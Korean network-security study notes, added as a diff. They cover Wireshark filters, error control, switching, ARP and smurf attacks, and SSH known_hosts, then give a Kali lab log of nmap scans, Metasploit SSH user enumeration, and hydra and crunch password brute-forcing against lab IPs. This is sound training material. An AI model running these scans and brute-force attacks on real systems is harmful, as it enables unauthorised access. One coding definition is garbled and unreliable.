@@ -1,0 +1,246 @@
+
+Wire Shark
+디스플레이 필터 구문
+eq         ==
+or           ||
+and        &&
+gt           >
+lt            <
+ge         >=
+le          <=
+not          !
+ne          !=
+contains
+matches
+
+
+논리주소
+물리주소
+데이터링크 계층
+CSMA/CD
+FCS
+
+
+                    
+오류제어
+전진 오류 수정(FEC) : 
+ - 데이터 전송 과정에서 발생한 오류를 검출하여 검출된 오류를 재전송 요구 없이 스스로 수정하는 방식
+ - 오류 검출과 수정을 워한 방식에는 해밍 코드 방식과 상승 코드 방식이 있다.
+	해밍 코드 : 데이터에 오류 검출 및 수정을 위해 추가된 비트로, 특정 규칙에 따라 데이터 비트와 패러티 비트를 결합하여 오류를 감지하고 수정할 수 있는 코드
+	상승코드 : 데이터의 전송 속도를 증가시키기 위해 사용되는 통신 기법으로, 신호의 대역폭을 확장하여 전송속도를 향상시키는 방법
+후진 오류 수정(BEC) : 
+ - 데이터 전송 과정에서 오류가 발생하면 송신 측에 재전송을 요구하는 방식
+ - 패리티 검사, CRC, 블록합 검사를 사용하여 오류를 검출하고 오류제어는 자동 반봅 요청(ARQ)
+
+
+
+1. 이더넷에서 이더넷 헤더와 트레일러를 추가하여 프레임을 만들고, 물리 계층에서 이 프레임 비트열을 전기신호로 변환하여 네트워크를 통해 전송한다.
+2. Switch MAC Address Table는 스위치의 포트와 해당 포트에 연결된 컴퓨터의 MAC주소가 등록되는 데이터베이스이다.
+3. 플러딩(flooding, 홍수)는 MAC Address Table에 등록되지 않은 MAC주로를 찾기 위해 송신 포트 이외의 포트에 데이터(프레임)을 전송하는 것을 의미한다.
+4. MAC 주소 필터링은 Switch MAC Address Table 기준으로 목적지를 선택하는 것을 의미한다.
+5. 전이중 통신 방식은 데이터 송수신을 동시에 통신하는 방식이고, 반이중 통신 방식은 회선 하나로 송신과 수신을 번갈아 가면서 통신하는 방식이다. (컴퓨터끼리 랜으로 연결 또는 스위치로 연결시 전이중, 더미허브를 이용하여 연결시 반이중)- 반이중 통신 방식으로 동시에 데이터 전송시 충돌 발생(Collision Domain)
+ ▷ 전이중(Full-Duplex) 장비 : 동시에 송신(TX)과 수신(RX)이 가능한 장비
+  - 이더넷 스위치, 전화기(유선&VoIP, 동시에 말하고 들을 수있다), USB, Bluetooth 5.0이상 등
+  - Wi-Fi (802.11ax 및 일부 802.11ac), 광섬유 통신 장비 (Fiber Optic Devices)
+ ▷ 반이중(Half-Duplex) 장비 : 반이중은 한 번에 한 방향으로만 송신 또는 수신이 가능한 장비를 의미
+  - 허브(충돌 방지를 위해 한 번에 하나의 장치만 데이터 전송), 무전기, 일부 Wi-Fi 기술 (구형 802.11a/b/g/n)
+
+3계층 브로드캐스트(Broadcast) 주소
+ - 255.255.255.255(Local(Limited) Broadcast)
+   동일 로컬 네트워크 내에서 모든 노드로 전달
+ - x.x.x.255 (Directed Broadcast) - 스머프 공격
+   다른 네트워크에 브로드캐스트 메시지를 전달
+스머프 공격은 Directed Breadcast를 공격하는 공격 기법이다.
+
+
+스위치 재밍 / MAC Flooding 공격
+
+ARP Spoofing공격 - MAC을 속여 트래픽 스니핑, 2계층
+
+ARP Redirect Tool : flagrouter, Cain & Abel
+
+
+
+
+1. known_hosts 파일은
+known_hosts 파일은 클라이언트 측에서 SSH 서버의 공개 키를 저장하고, 이후에 서버와의 연결에서 서버의 신뢰성을 확인하는 데 사용된다. 이 파일에 저장된 서버의 공개 키는 서버가 변경되지 않았다는 것을 확인하는 역할을 하여, 중간자 공격(Man-in-the-Middle Attack)을 방지하는 데 도움을 준다.
+
+2. Client가 Server 점속 시 (Server : /etc/ssh에 key가 있다)
+1) 첫 번째 SSH접속 시, 클라이언트는 서버의 공개 키를 known_hosts 파일에 저장하려고 시도한다.
+2) 클라이언트가 서버에 접속하면, 서버는 자신을 식별알 수 있는 공개 키를 클라이언트에게 보낸다.
+3) 클라이언트는 서버의 공개 키를 known_hosts 파일에 저장하고, 그 후의 접속 시에는 해당 키를 사용하여 서버의 신뢰성을 검증한다.
+
+3. known_host의 역할
+1) 서버 검증: 클라이언트가 다시 해당 서버에 접속할 때, 서버의 공개 키와 known_hosts 파일에 저장된 공개 키를 비교하여 서버가 동일한 서버인지 확인한다.
+ - 만약 공개 키가 일치하면, 서버가 신뢰할 수 있는 서버임을 확인하고 연결을 계속한다.
+ - 공개 키가 다르면, 서버가 변경되었거나 중간자 공격이 있을 가능성이 있으므로 경고 메시지를 띄우고, 사용자가 확인할 수 있도록 한다.
+  - 중간자 공격 방지: 중간자 공격(MITM)은 공격자가 클라이언트와 서버 사이에 끼어들어, 서버의 공개 키를 가로채고 변조할 수 있는 공격 방식이다. known_hosts 파일은 서버의 공개 키를 비교함으로써, 중간자 공격을 탐지하는 데 중요한 역할을 한다.
+
+4. known_hosts 파일의 구조
+ 1) known_hosts 파일은 여러 서버의 공개 키를 호스트명 또는 IP 주소와 함께 저장한다.
+ 2) 서버의 호스트명이나 IP 주소, 알고리즘, 서버의 공개 키
+
+5 정리
+ 1) SSH 키 교환에서 사용하는 공개 키와 개인 키는 비대칭 암호화에 해당한다.
+ 2) SSH 통신 중에 데이터 암호화와 복호화에는 대칭 암호화 방식이 사용된다. 즉, 키 교환을 통해 생성된 공유 비밀 키는 대칭 키로 사용되어 실제 데이터 암호화를 처리한다. 따라서 SSH 연결 후 세션 암호화에 사용되는 것은 대칭 암호화 방식이다.
+ 3) known_hosts 파일은 서버의 공개 키를 저장하여, 서버의 신뢰성을 검증하는 데 사용되며, 이것은 비대칭 암호화와 관련이 있다.
+
+
+root@kali:/home/kali# nmap -p 22 -sV -sC -Pn -n 10.0.0.200 
+root@kali:/home/kali# searchsploit openssl 
+root@kali:/home/kali# nmap -p 22 -sV -Pn -n --script="ssh*" 10.0.0.200
+
+root@kali:/home/kali# nc -v 10.0.0.200 22 
+root@kali:/home/kali# nc -v 10.0.0.200 80
+root@kali:/home/kali# nc -zv 10.0.0.200 23  
+root@kali:/home/kali# nc -v 10.0.0.200 23
+
+
+msf > search ssh_enumusers
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/ssh_enumusers  .                normal  No     SSH Username Enumeration
+   1    \_ action: Malformed Packet        .                .       .      Use a malformed packet
+   2    \_ action: Timing Attack           .                .       .      Use a timing attack
+
+
+
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+msf auxiliary(scanner/ssh/ssh_enumusers) > show info
+msf auxiliary(scanner/ssh/ssh_enumusers) > show options
+
+msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.0.0.143
+msf auxiliary(scanner/ssh/ssh_enumusers) > show info
+msf auxiliary(scanner/ssh/ssh_enumusers) > exploit
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+msf auxiliary(scanner/ssh/ssh_enumusers) > set username msfadmin
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+
+
+
+root@kali:/home/kali# updatedb
+root@kali:/home/kali# locate usernames.lst
+root@kali:/home/kali# locate user.txt
+root@kali:/home/kali# cat /usr/share/legion/wordlists/ssh-user.txt
+root@kali:/home/kali# cp /usr/share/legion/wordlists/ssh-user.txt ./
+root@kali:/home/kali# mv ssh-user.txt username.txt
+root@kali:/home/kali# cat rockyou.txt| head -30 > password.txt
+
+
+msf auxiliary(scanner/ssh/ssh_enumusers) > set user_file /home/kali/username.txt
+msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.0.0.200
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+
+
+
+root@kali:/home/kali# hydra -L ./username.txt -P ./password.txt ssh://10.0.0.200 -v -V
+
+root@kali:/home/kali# hydra -l roror -P ./password.txt ssh://10.0.0.200 -v -V
+root@kali:/home/kali# hydra -L ./username.txt -P ./password.txt ssh://10.0.0.143 -v -V
+root@kali:/home/kali# hydra -L ./username.txt -P ./password.txt ssh://10.0.0.143 -v -V -f
+// -f : 찾으면 바로 종료
+
+systemctl set-default graphical.target
+
+
+cd /usr/share
+  513  cd crunch
+  514  ls
+  515  cd
+  516  crunch 1 4 -f /usr/share/crunch/charset.lst numeric 
+  517  crunch 1 4 -f /usr/share/crunch/charset.lst numeric -o ./password.txt
+  518  cat ./password.txt
+  519  crunch 1 4 -f /usr/share/crunch/charset.lst mixalpha-numeric-space-sv -o ./password.txt
+  520  vi password.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
